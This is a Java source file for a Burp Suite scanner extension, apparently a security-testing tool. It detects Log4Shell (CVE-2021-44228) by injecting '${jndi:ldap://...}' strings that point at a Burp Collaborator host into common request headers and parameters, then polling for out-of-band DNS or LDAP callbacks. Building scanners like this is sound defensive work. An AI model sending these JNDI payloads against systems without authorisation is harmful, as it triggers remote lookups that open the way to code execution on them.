package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.ui.ScanLog;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import java.util.function.UnaryOperator;

/**
 * Out-of-band Log4Shell / JNDI-injection confirmation via Burp Collaborator (CVE-2021-44228, CWE-917).
 * Sprays a {@code ${jndi:ldap://<collab>}} payload into the request headers apps most commonly LOG
 * (User-Agent, X-Api-Version, X-Forwarded-For, Referer, …) plus each parameter, then polls for a callback:
 * a DNS/LDAP interaction proves a vulnerable Log4j2 resolved our JNDI lookup — deterministic, zero-FP by
 * construction (only a server that evaluated the lookup can reach our unique Collaborator subdomain).
 *
 * <p>Header-driven because Log4Shell fires wherever tainted input reaches a logger, and request headers are the
 * classic sink (logged regardless of route/auth). Each header/param carries a UNIQUE Collaborator subdomain so
 * an interaction attributes back to the exact injection point. Generic: no per-app header/route knowledge.</p>
 */
public final class Log4ShellProbe {

    private final MontoyaApi api;
    private final ScanLog scanLog;
    // Daemon pool used ONLY to bound a single collab.getAllInteractions() call — Montoya's Collaborator polling has
    // no client timeout, so a slow/unreachable Collaborator server can block each poll ~50s (17 min over 20 rounds).
    private static final ExecutorService POLL_POOL = Executors.newCachedThreadPool(r -> {
        Thread t = new Thread(r, "log4shell-poll"); t.setDaemon(true); return t;
    });

    // Headers apps routinely funnel into a logger — the classic Log4Shell reach (a request logs them pre-auth).
    private static final String[] HEADERS = {
        "X-Api-Version", "User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
        "X-Client-IP", "X-Real-IP", "True-Client-IP", "Forwarded", "Origin",
        "Accept-Language", "X-Requested-With", "X-Api-Key", "Authorization"
    };
    private static final int MAX_ENDPOINTS = 8;   // bound request volume: base URL + up to 7 distinct target paths

    public Log4ShellProbe(MontoyaApi api, ScanLog scanLog) {
        this.api = api;
        this.scanLog = scanLog;
    }

    /**
     * @param baseUrl scheme://authority of the target (the header spray always hits its root), or null
     * @param targets discovered audit targets (their root paths get a header spray; their params get a payload)
     */
    public int probe(String baseUrl, List<HttpRequest> targets, UnaryOperator<HttpRequest> withSession) {
        CollaboratorClient collab;
        try { collab = api.collaborator().createClient(); }
        catch (Throwable t) { scanLog.debug("  log4shell: Collaborator unavailable — JNDI OAST skipped"); return 0; }

        Map<String, String[]> tagToPoint = new LinkedHashMap<>();          // tag -> {url, point-label}
        Map<String, HttpRequestResponse> tagToRr = new LinkedHashMap<>();  // tag -> the request that carried the payload
        int[] idx = {0};

        // Distinct endpoints to spray with header payloads (base URL + discovered target paths), capped.
        LinkedHashSet<String> urls = new LinkedHashSet<>();
        if (baseUrl != null && !baseUrl.isBlank()) urls.add(baseUrl.replaceAll("/+$", "") + "/");
        if (targets != null) for (HttpRequest req : targets) {
            if (urls.size() >= MAX_ENDPOINTS) break;
            try { urls.add(req.url()); } catch (Throwable ignore) { }
        }
        for (String url : urls) {
            try { fireHeaders(collab, tagToPoint, tagToRr, idx, url, withSession); } catch (Throwable ignore) { }
        }

        // Also inject each param of a bounded set of targets (some apps log request params/bodies).
        if (targets != null) {
            int n = 0;
            for (HttpRequest req : targets) {
                if (n++ >= MAX_ENDPOINTS) break;
                try { fireParams(collab, tagToPoint, tagToRr, idx, req, withSession); } catch (Throwable ignore) { }
            }
        }

        if (tagToPoint.isEmpty()) return 0;
        scanLog.debug("  log4shell: fired " + tagToPoint.size() + " JNDI payload(s); polling Collaborator…");
        return poll(collab, tagToPoint, tagToRr);
    }

    /** One request carrying a distinct-tagged ${jndi:...} payload in each common log-sink header. */
    private void fireHeaders(CollaboratorClient collab, Map<String, String[]> tagToPoint,
                             Map<String, HttpRequestResponse> tagToRr, int[] idx, String url,
                             UnaryOperator<HttpRequest> withSession) {
        HttpRequest m;
        try { m = HttpRequest.httpRequestFromUrl(url); } catch (Throwable t) { return; }
        List<String> tags = new ArrayList<>();
        for (String hdr : HEADERS) {
            String tag = "log4j" + (idx[0]++);
            CollaboratorPayload cp = collab.generatePayload(tag);
            String payload = "${jndi:ldap://" + cp.toString() + "/" + tag + "}";
            m = m.hasHeader(hdr) ? m.withUpdatedHeader(hdr, payload) : m.withAddedHeader(hdr, payload);
            tagToPoint.put(tag, new String[]{ url, "header:" + hdr });
            tags.add(tag);
        }
        HttpRequestResponse rr = send(m, withSession);
        scanLog.debug("  log4shell: sprayed " + tags.size() + " header payload(s) → " + url);
        if (rr != null) for (String tag : tags) tagToRr.put(tag, rr);
    }

    /** One request per target carrying a distinct-tagged ${jndi:...} payload in each URL/BODY parameter. */
    private void fireParams(CollaboratorClient collab, Map<String, String[]> tagToPoint,
                            Map<String, HttpRequestResponse> tagToRr, int[] idx, HttpRequest req,
                            UnaryOperator<HttpRequest> withSession) {
        HttpRequest m = req;
        List<String> tags = new ArrayList<>();
        boolean any = false;
        for (ParsedHttpParameter p : req.parameters()) {
            if (p.type() != HttpParameterType.URL && p.type() != HttpParameterType.BODY) continue;
            String tag = "log4j" + (idx[0]++);
            CollaboratorPayload cp = collab.generatePayload(tag);
            String payload = "${jndi:ldap://" + cp.toString() + "/" + tag + "}";
            m = m.withUpdatedParameters(HttpParameter.parameter(p.name(), payload, p.type()));
            tagToPoint.put(tag, new String[]{ req.url(), "param:" + p.name() + " (" + p.type() + ")" });
            tags.add(tag); any = true;
        }
        if (!any) return;
        HttpRequestResponse rr = send(m, withSession);
        if (rr != null) for (String tag : tags) tagToRr.put(tag, rr);
    }

    private HttpRequestResponse send(HttpRequest req, UnaryOperator<HttpRequest> withSession) {
        HttpRequest s = withSession != null ? withSession.apply(req) : req;
        try {
            return api.http().sendRequest(s, RequestOptions.requestOptions().withResponseTimeout(15000L));
        } catch (Throwable t) {
            try { return HttpRequestResponse.httpRequestResponse(s, null); } catch (Throwable ignore) { return null; }
        }
    }

    private int poll(CollaboratorClient collab, Map<String, String[]> tagToPoint, Map<String, HttpRequestResponse> tagToRr) {
        int hits = 0;
        Set<String> fired = new LinkedHashSet<>();
        // Poll window: a JNDI DNS lookup usually fires within seconds, but a slow/async logger, a container DNS
        // round-trip, or an LDAP-only (no-DNS) sink can lag — 15s was too tight (christophetd log4shell fired the
        // lookup but the interaction hadn't been retrieved yet). Default ~50s, overridable.
        int rounds = Integer.getInteger("aiscanner.log4shellPollRounds", 20);
        long budgetMs = Long.getLong("aiscanner.log4shellPollBudgetMs", 60_000L);   // hard wall-clock cap on the whole poll
        long perCallMs = Long.getLong("aiscanner.log4shellPollCallMs", 8_000L);     // cap ONE getAllInteractions() call
        long startMs = System.currentTimeMillis();
        try {
            for (int round = 0; round < rounds; round++) {
                if (System.currentTimeMillis() - startMs >= budgetMs) {
                    scanLog.debug("  log4shell: poll budget (" + budgetMs + "ms) reached — stopping after " + round + " round(s)");
                    break;
                }
                Thread.sleep(2500);
                List<Interaction> interactions;
                // Bound the blocking Collaborator poll: a slow/unreachable server must not stretch the phase.
                try {
                    Future<List<Interaction>> f = POLL_POOL.submit(collab::getAllInteractions);
                    try { interactions = f.get(perCallMs, TimeUnit.MILLISECONDS); }
                    catch (TimeoutException te) { f.cancel(true); scanLog.debug("  log4shell: getAllInteractions > " + perCallMs + "ms — Collaborator slow/unreachable, stopping poll"); break; }
                } catch (Throwable t) { scanLog.debug("  log4shell: getAllInteractions error: " + t); break; }
                if (interactions == null || interactions.isEmpty()) continue;
                for (Interaction it : interactions) {
                    String tag = it.customData().orElse(null);
                    String[] pt = tag == null ? null : tagToPoint.get(tag);
                    if (pt == null || !fired.add(tag)) continue;
                    scanLog.found("Log4Shell / JNDI injection (RCE)", pt[0],
                            pt[1] + " → a ${jndi:ldap://…} payload triggered an out-of-band " + it.type()
                          + " lookup — a vulnerable Log4j2 resolved our JNDI reference (CVE-2021-44228, CWE-917), "
                          + "proven out-of-band. Unauthenticated remote code execution.",
                            tagToRr.get(tag));
                    scanLog.incFinding();
                    hits++;
                }
            }
        } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
        catch (Throwable t) { scanLog.debug("  log4shell: poll error: " + t); }
        scanLog.debug("  log4shell: poll done — " + hits + " endpoint(s) confirmed across " + rounds + " round(s).");
        return hits;
    }
}
